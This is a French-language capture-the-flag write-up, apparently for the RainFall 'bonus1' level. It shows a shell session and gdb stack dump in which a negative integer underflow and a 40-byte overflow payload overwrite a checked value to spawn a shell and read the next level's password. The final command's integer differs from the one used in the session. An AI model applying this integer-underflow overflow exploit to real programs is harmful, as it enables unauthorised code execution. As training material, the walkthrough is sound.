@@ -1,0 +1,59 @@
+bonus1@RainFall:~$ 
+bonus1@RainFall:~$ ./bonus1 -2147483603 "python -c 'print("a" * 40 + "\x46\x4c\x4f\x57")"
+Segmentation fault (core dumped)
+bonus1@RainFall:~$ ./bonus1 -2147483603 "$(python -c 'print("a" * 40 + "\x46\x4c\x4f\x57"))"
+> 
+> 
+> ^C
+bonus1@RainFall:~$ python -c 'print("a" * 40 + "\x46\x4c\x4f\x57") > /tmp/payload
+> ^C
+bonus1@RainFall:~$ python -c 'print("a" * 40 + "\x46\x4c\x4f\x57")' > /tmp/payload
+bonus1@RainFall:~$ ./bonus1 -2147483603 "$(< /tmp/payload)"
+$ pwd
+/home/user/bonus1
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+$ 
+
+Dans cette exercice, nous avons un bianire qui lance un shell si on donne en argument 0x574f4c46
+
+Si argv[1] est superieur a 10, le programme exit.
+
+Explication de l'exploit :
+
+Si on met la valeur maximal autoriser par le programme (9) dans argv[1] et 100 "a" dans argv[2] et qu'on lance le programme sous gdb on peut voir ce qu'on a dans la stack.
+
+1) break main; run 9 $(python -c 'print("a" * 100)');
+
+On va jusqu'au memcpy et on affiche la stack.
+
+x/60/xw $esp
+
+gdb-peda$ x/60xw $esp
+0xbffff560:	0xbffff574	0xbffff7ba	0x00000024	0x080482fd
+0xbffff570:	0xb7fd13e4	0x61616161	0x61616161	0x61616161
+0xbffff580:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbffff590:	0x61616161	0x61616161	0x080484b9	0x00000009
+0xbffff5a0:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
+0xbffff5b0:	0x00000003	0xbffff644	0xbffff654	0xb7fdc858
+0xbffff5c0:	0x00000000	0xbffff61c	0xbffff654	0x00000000
+0xbffff5d0:	0x0804821c	0xb7fd0ff4	0x00000000	0x00000000
+0xbffff5e0:	0x00000000	0x70ffc371	0x47bd8761	0x00000000
+0xbffff5f0:	0x00000000	0x00000000	0x00000003	0x08048370
+0xbffff600:	0x00000000	0xb7ff26b0	0xb7e453e9	0xb7ffeff4
+0xbffff610:	0x00000003	0x08048370	0x00000000	0x08048391
+0xbffff620:	0x08048424	0x00000003	0xbffff644	0x080484b0
+0xbffff630:	0x08048520	0xb7fed280	0xbffff63c	0xb7fff918
+0xbffff640:	0x00000003	0xbffff79f	0xbffff7b8	0xbffff7ba
+
+on vois nos 'a' et le plus interessant, notre 9 a l'offset 0xbffff59f
+
+Vu que notre memcpy nous permet d'ecrire que 9 * 4 octet au maximum, nous devons faire un underflow pour ecrire plus loin.
+
+Apres quelque test, si on underflow avec la valeur -2147483630 on ecris sur $esp+0x1c nos "a".
+si on ecris la valeur comparer dans le programme a la bonne adresse nous avons notre shell.
+
+python -c 'print("a" * 40 + "\x46\x4c\x4f\x57")' > /tmp/payload
+
+./bonus1 -2147483630 "$(< /tmp/payload)"
+
